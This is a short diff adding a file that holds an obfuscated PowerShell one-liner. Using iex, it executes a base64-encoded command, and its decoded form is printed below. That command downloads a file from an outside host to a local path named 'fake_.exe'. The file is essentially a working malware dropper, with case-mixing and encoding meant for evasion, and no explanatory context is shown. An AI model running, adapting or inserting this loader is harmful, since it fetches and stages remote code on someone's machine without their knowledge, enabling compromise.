@@ -1,0 +1,7 @@
+iex([sYstem.TexT.EncODinG]::UTF8.gETstRING([system.ConvERT]::frOMbasE64strInG('CmNtZCAvYyBwb3dlcnNoZWxsIC1Db21tYW5kIChuZXctb2JqZWN0IFN5c3RFTS5OZVQuV2VCY0xpRW5UKS5ET3dOTE9BREZpbEUoJ2h0dHA6Ly90cmF4LngxMC5teC9jb3VudF92dC50eHQnLCAnQzpcX0FCXGZha2VfLmV4ZScpIDsgJ0RvbmUuJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+cmd /c powershell -Command (new-object SystEM.NeT.WeBcLiEnT).DOwNLOADFilE('http://trax.x10.mx/count_vt.txt', 'C:\_AB\fake_.exe') ; 'Done.'
+
